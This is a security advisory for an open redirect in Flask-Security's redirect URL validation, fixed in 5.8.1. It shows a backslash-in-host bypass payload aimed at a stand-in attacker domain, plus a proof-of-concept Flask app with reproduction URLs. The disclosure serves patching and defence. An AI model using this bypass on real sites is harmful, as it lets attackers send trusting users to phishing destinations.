# [M] Flask-Security has an Open Redirect issue

## Summary
Severity: Medium
Advisory: GHSA-w2j7-f3c6-g8cw
CWE: CWE-601
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-w2j7-f3c6-g8cw
Type: github-advisory

## Affected
- PyPI: `Flask-Security` — affected >=0 <5.8.1

## Details
# Open Redirect in Flask-Security

## Summary

`flask_security.utils.validate_redirect_url()` can allow an attacker-controlled redirect URL when subdomain redirects are enabled.

The bypass uses a backslash inside the URL authority/host:

```text
http://evil.com\.whitelist.com
http://evil.com%5C.whitelist.com
```

Python's `urlsplit()` parses the full authority as `evil.com\.whitelist.com` or `evil.com%5C.whitelist.com`. Because the value ends with `.whitelist.com`, `validate_redirect_url()` accepts it as an allowed subdomain of `whitelist.com`.

This is similar in class to the previous Flask-Security-Too open redirect advisory CVE-2023-49438 / GHSA-672h-6x89-76m5, where crafted redirect URLs bypassed validation through browser URL normalization behavior.

## Affected Configuration

The issue requires subdomain redirects to be enabled:

```python
SERVER_NAME = "whitelist.com"
SECURITY_REDIRECT_ALLOW_SUBDOMAINS = True
```

Tested environment:

```text
Flask-Security: 5.8.0
Flask: 3.1.3
Werkzeug: 3.1.8
```

## Impact

An attacker can craft a URL that passes Flask-Security's redirect validation and produces a `302` response to an attacker-controlled URL-like authority.

This can be used for phishing or other attacks that rely on a trusted application redirecting users to an attacker-controlled destination.

## Proof of Concept

### PoC Flask App

```python
from __future__ import annotations

from importlib.metadata import version
from urllib.parse import urlsplit

from flask import Flask, jsonify, redirect, request

from flask_security.utils import validate_redirect_url


app = Flask(__name__)
app.config.update(
    SECRET_KEY="poc-only",
    SERVER_NAME="whitelist.com",
    SECURITY_REDIRECT_ALLOW_SUBDOMAINS=True,
    SECURITY_REDIRECT_BASE_DOMAIN=None,
    SECURITY_REDIRECT_ALLOWED_SUBDOMAINS=[],
)


@app.get("/")
def index():
    return jsonify(
        flask_version=version("Flask"),
        configured_server_name=app.config["SERVER_NAME"],
        examples=[
            r"http://evil.com\.whitelist.com",
            "http://evil.com%5C.whitelist.com",
            "http://sub.whitelist.com",
            "http://sub.not-whitelist.com",
        ],
    )


@app.get("/check")
def check():
    next_url = request.args.get("next", "")
    parsed = urlsplit(next_url)

    return jsonify(
        next=next_url,
        valid=validate_redirect_url(next_url),
        parsed={
            "scheme": parsed.scheme,
            "netloc": parsed.netloc,
            "hostname": parsed.hostname,
            "path": parsed.path,
        },
    )


@app.get("/redir")
def redir():
    next_url = request.args.get("next", "")
    if not validate_redirect_url(next_url):
        return jsonify(error="blocked", next=next_url), 400

    return redirect(next_url)


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=False)
```

### Steps to Reproduce

Run the PoC with the target project's Flask version:

```bash
.venv/bin/python poc_redirect_app.py
```

The invalid comparison case is correctly blocked:

```bash
http://127.0.0.1:5000/redir?next=http://evil.com
```

Observed result:

<img width="1019" height="294" alt="image" src="https://github.com/user-attachments/assets/de25ac4d-b37f-4369-928e-f44dfd5b7557" />

Check the validation result:

```bash
http://127.0.0.1:5000/check?next=http://evil.com%5C.whitelist.com
```

Observed result:

<img width="1029" height="634" alt="image" src="https://github.com/user-attachments/assets/8e5ec8a6-42a4-438a-8d12-a27724519091" />

## References

- CVE-2023-49438: https://advisories.gitlab.com/pypi/flask-security-too/CVE-2023-49438/
- GHSA-672h-6x89-76m5: https://osv.dev/vulnerability/CVE-2023-49438
- NVD entry for CVE-2023-49438: https://nvd.nist.gov/vuln/detail/CVE-2023-49438

## References
- https://github.com/pallets-eco/flask-security/security/advisories/GHSA-w2j7-f3c6-g8cw
- https://nvd.nist.gov/vuln/detail/CVE-2023-49438
- https://advisories.gitlab.com/pypi/flask-security-too/CVE-2023-49438
- https://github.com/pallets-eco/flask-security
- https://osv.dev/vulnerability/CVE-2023-49438
